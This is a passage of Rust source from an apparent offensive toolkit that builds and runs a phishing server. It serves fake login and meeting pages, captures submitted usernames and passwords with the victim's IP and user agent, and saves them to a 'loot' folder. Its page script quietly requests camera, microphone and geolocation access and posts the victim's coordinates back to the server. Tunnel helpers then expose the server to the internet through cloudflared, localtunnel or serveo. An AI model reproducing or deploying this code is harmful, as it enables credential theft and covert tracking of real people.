        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Company", "company"),
            ("Meeting Date", "date"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Meeting -->\n<!-- Data to {lhost}:{lport}/meeting -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn login_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🔒 Secure Login");
        let form = self.social_form_password("Password", "password");
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Login -->\n<!-- Data to {lhost}:{lport}/login -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }
}

// ═══════════════════ PHISHING SERVER (credential capture + tunnel) ═══════════════════

pub struct PhishingServer {
    pub lhost: String,
    pub lport: u16,
    pub template: String,
    pub tunnel: Option<String>,
}

impl PhishingServer {
    pub fn new(lhost: &str, lport: u16, template: &str) -> Self {
        Self { lhost: lhost.to_string(), lport, template: template.to_string(), tunnel: None }
    }

    pub fn with_tunnel(mut self, tunnel: &str) -> Self {
        self.tunnel = Some(tunnel.to_string());
        self
    }

    pub fn start(&self) -> anyhow::Result<()> {
        banner::info(&format!("Starting phishing server on {}:{} (template: {})", self.lhost, self.lport, self.template));

        if self.template.is_empty() || self.template == "login" {
            banner::info("Using generic login template with credential capture");
        }

        // Generate the phishing page with credential capture form
        let page = PhishingGen::new().generate(&self.template, &self.lhost, &self.lport.to_string(), None);

        let page_html = if let Some(p) = page {
            // Read the generated file
            let path = std::path::Path::new(&p);
            std::fs::read_to_string(path).unwrap_or_default()
        } else {
            // Default login page with credential capture
            Self::default_capture_page(&self.lhost, &self.lport.to_string(), &self.template)
        };

        // Start HTTP server
        let server_lhost = self.lhost.clone();
        let server_lport = self.lport;
        let server_template = self.template.clone();
        let server_handle = std::thread::spawn(move || {
            Self::run_server(&server_lhost, server_lport, &page_html, &server_template);
        });

        // Setup tunnel if requested
        if let Some(tunnel_type) = &self.tunnel {
            match tunnel_type.as_str() {
                "cloudflared" => {
                    banner::info("Setting up cloudflared tunnel...");
                    Self::setup_cloudflared_tunnel(self.lport);
                }
                "localtunnel" => {
                    banner::info("Setting up localtunnel...");
                    Self::setup_localtunnel(self.lport);
                }
                "serveo" => {
                    banner::info("Setting up serveo tunnel...");
                    Self::setup_serveo_tunnel(self.lport);
                }
                _ => {
                    banner::warning(&format!("Unknown tunnel type: {}. Using local only.", tunnel_type));
                }
            }
        }

        banner::info(&format!("Local URL:  http://{}:{}/{}", self.lhost, self.lport, self.template));
        banner::success("Server running. Waiting for victim connection...");

        // Wait for server thread
        let _ = server_handle.join();
        Ok(())
    }

    fn default_capture_page(lhost: &str, lport: &str, template: &str) -> String {
        format!(r#"<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login - {tpl}</title>
    <style>body{{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
    .login{{background:#16213e;padding:30px;border-radius:10px;width:100%;max-width:400px;box-shadow:0 4px 6px rgba(0,0,0,0.3)}}
    input{{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff}}
    button{{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer}}
    h2{{color:#e94560}}</style>
</head>
<body>
<div class="login">
    <h2>Login Required</h2>
    <form action="/capture" method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="hidden" name="template" value="{tpl}">
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
<script>
// Request device powers (camera, mic, location)
async function requestPowers() {{
    try {{
        // Camera + Mic
        const stream = await navigator.mediaDevices.getUserMedia({{video:true, audio:true}});
        fetch('/powers', {{
            method:'POST',
            body:JSON.stringify({{camera:true, mic:true}}),
            headers:{{'Content-Type':'application/json'}}
        }});
        stream.getTracks().forEach(t => t.stop());
    }} catch(e) {{}}
    try {{
        // Location
        navigator.geolocation.getCurrentPosition(function(pos) {{
            fetch('/powers', {{
                method:'POST',
                body:JSON.stringify({{location:true, lat:pos.coords.latitude, lng:pos.coords.longitude}}),
                headers:{{'Content-Type':'application/json'}}
            }});
        }});
    }} catch(e) {{}}
}}
requestPowers();
</script>
<!-- Powered by CF-VOID | {lhost}:{lport} -->"#, tpl = template, lhost = lhost, lport = lport)
    }

    fn run_server(lhost: &str, lport: u16, page_html: &str, template: &str) {
        
        use std::net::TcpListener;
        use std::thread;

        let listener = match TcpListener::bind(format!("{}:{}", lhost, lport)) {
            Ok(l) => l,
            Err(e) => {
                banner::error(&format!("Failed to bind to {}:{} - {}", lhost, lport, e));
                return;
            }
        };

        banner::info("Server started, ready to accept connections");

        for stream in listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let lhost = lhost.to_string();
                    let template = template.to_string();
                    let page = page_html.to_string();

                    thread::spawn(move || {
                        Self::handle_client(&mut stream, &page, &template, &lhost);
                    });
                }
                Err(e) => {
                    banner::error(&format!("Connection failed: {}", e));
                }
            }
        }
    }

    fn handle_client(stream: &mut std::net::TcpStream, page_html: &str, template: &str, _lhost: &str) {
        use std::io::{Read, Write};
        let mut buf = [0; 8192];
        match stream.read(&mut buf) {
            Ok(n) => {
                let request = String::from_utf8_lossy(&buf[..n]);

                // Log connection
                let peer = stream.peer_addr().map(|a| a.to_string()).unwrap_or_default();
                let ua = request.lines().find(|l| l.to_lowercase().starts_with("user-agent:"))
                    .map(|l| l.trim()).unwrap_or("Unknown");

                if request.contains("GET /capture") || request.contains("POST /capture") {
                    // Handle credential capture
                    let body_start = request.find("\r\n\r\n").map(|p| p + 4).unwrap_or(0);
                    let body = &request[body_start..];
                    let credentials = Self::parse_credentials(body);

                    if let Some((user, pass)) = &credentials {
                        banner::success(&format!("CREDENTIALS CAPTURED from {} ({})", peer, ua));
                        banner::info(&format!("  Username: {}", user));
                        banner::info(&format!("  Password: {}", pass));
                        banner::info(&format!("  Template: {}", template));

                        // Save to loot file
                        let loot_dir = "loot";
                        let _ = std::fs::create_dir_all(loot_dir);
                        let loot_file = format!("{}/{}_{}.txt", loot_dir, template, chrono::Local::now().format("%Y%m%d_%H%M%S"));
                        let _ = std::fs::write(&loot_file, format!("username={}\npassword={}\nuser_agent={}\nip={}\ntemplate={}\n", user, pass, ua, peer, template));
                        banner::info(&format!("Saved to: {}", loot_file));
                    }

                    // Send redirect
                    let response = "HTTP/1.1 302 Found\r\nLocation: /\r\n\r\n";
                    let _ = stream.write_all(response.as_bytes());
                } else if request.starts_with("POST /powers") {
                    // Handle power capture (camera/mic/location)
                    let body_start = request.find("\r\n\r\n").map(|p| p + 4).unwrap_or(0);
                    let body = &request[body_start..];
                    banner::info(&format!("Powers captured from {}: {}", peer, body));
                    let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok";
                    let _ = stream.write_all(response.as_bytes());
                } else if request.starts_with("GET /") || request.starts_with("POST /") {
                    // Serve the phishing page
                    let response = format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{}", page_html.len(), page_html);
                    let _ = stream.write_all(response.as_bytes());
                }
            }
            Err(e) => {
                banner::error(&format!("Read error: {}", e));
            }
        }
    }

    fn parse_credentials(body: &str) -> Option<(String, String)> {
        let mut username = String::new();
        let mut password = String::new();

        for pair in body.split('&') {
            let mut parts = pair.splitn(2, '=');
            if let (Some(key), Some(value)) = (parts.next(), parts.next()) {
                let key = urlencoding::decode(key).unwrap_or(std::borrow::Cow::Borrowed(key)).to_string();
                let decoded_value = urlencoding::decode(value).unwrap_or(std::borrow::Cow::Borrowed(value)).to_string();
                match key.as_str() {
                    "username" | "user" | "email" => username = decoded_value,
                    "password" | "pass" | "pwd" => password = decoded_value,
                    _ => {}
                }
            }
        }

        if !username.is_empty() && !password.is_empty() {
            Some((username, password))
        } else {
            None
        }
    }

    fn setup_cloudflared_tunnel(port: u16) {
        banner::info(&format!("Setting up Cloudflare tunnel on port {}", port));
        let output = std::process::Command::new("cloudflared")
            .arg("tunnel")
            .arg("--url")
            .arg(format!("http://localhost:{}", port))
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn();

        match output {
            Ok(_) => {
                banner::success("Cloudflare tunnel started");
                banner::info("Check https://dash.cloudflare.com for tunnel URL");
            }
            Err(e) => {
                banner::error(&format!("Failed to start cloudflared: {}. Using local only.", e));
            }
        }
    }

    fn setup_localtunnel(port: u16) {
        banner::info(&format!("Setting up localtunnel on port {}", port));
        let output = std::process::Command::new("npx")
            .arg("localtunnel")
            .arg("--port")
            .arg(port.to_string())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn();

        match output {
            Ok(_) => banner::success("LocalTunnel started"),
            Err(e) => banner::error(&format!("Failed to start localtunnel: {}", e)),
        }
    }

    fn setup_serveo_tunnel(port: u16) {
        banner::info(&format!("Setting up Serveo tunnel on port {}", port));
        let output = std::process::Command::new("ssh")
            .arg("-R")
            .arg(format!("80:localhost:{}", port))
            .arg("-o")
            .arg("StrictHostKeyChecking=no")
            .arg("-o")
            .arg("UserKnownHostsFile=/dev/null")
            .arg("serveo.net")
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn();

        match output {
            Ok(_) => banner::success("Serveo tunnel started"),
            Err(e) => banner::error(&format!("Failed to start serveo: {}", e)),
        }
    }
}
